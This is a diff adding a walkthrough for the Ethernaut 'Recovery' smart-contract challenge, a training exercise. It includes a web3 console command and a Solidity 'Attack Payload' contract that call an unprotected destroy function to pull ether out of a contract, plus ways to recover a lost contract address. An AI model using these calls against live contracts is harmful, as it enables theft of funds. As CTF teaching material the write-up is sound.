@@ -597,3 +597,43 @@ contract Attack {
 
 Inside `attack()`, the first call to `setTime()` changes the address of `LibraryContract` store in `Preservation`. Address of `LibraryContract` is now set to Attack. The second call to `setTime()` calls `Attack.setTime()` and here we change the owner.
 
+
+
+
+# 17. [Challenge 17: Recovery](https://ethernaut.openzeppelin.com/level/0x0EB8e4771ABA41B70d0cb6770e04086E5aee5aB2)
+
+Tasks:
+- A contract creator has built a very simple token factory contract. Anyone can create new tokens with ease. After deploying the first token contract, the creator sent 0.5 ether to obtain more tokens. They have since lost the contract address. This level will be completed if you can recover (or remove) the 0.5 ether from the lost contract address.
+
+**Solution:** \
+To Solve in cmd line:
+```
+data = web3.eth.abi.encodeFunctionCall({name: 'destroy', type: 'function', inputs: [{type: 'address', name: '_to'}]}, [player]);
+await web3.eth.sendTransaction({to: "0xA0ffB380c2F8558474089A14767D8A0d0A5e9d05", from: player, data: data})
+```
+
+Attack Payload:
+```
+pragma solidity ^0.8.0;
+
+interface ISimpleToken {
+    function destroy(address payable _to) external;
+}
+
+contract SimpleToken {
+    address levelInstance;
+
+    constructor(address _levelInstance) {
+        levelInstance = _levelInstance;
+    }
+
+    function withdraw() public {
+        ISimpleToken(levelInstance).destroy(payable(msg.sender));
+    }
+}
+```
+
+This level requires to retrieve the address of SimpleToken. 
+The easiest way is to open etherscan and look at the transaction data directly, and you can directly see which address the ether was sent to. 
+Another method is to use the level contract address to calculate the contract address of SimpleToken. For the easiest understanding, please refer to [here](https://docs.openzeppelin.com/cli/2.8/deploying-with-create2#creating_a_smart_contract) :
+`keccack256(address, nonce)` where the address is the address of the contract (or ethereum address that created the transaction) and nonce is the number of contracts the spawning contract has created (or the transaction nonce, for regular transactions).
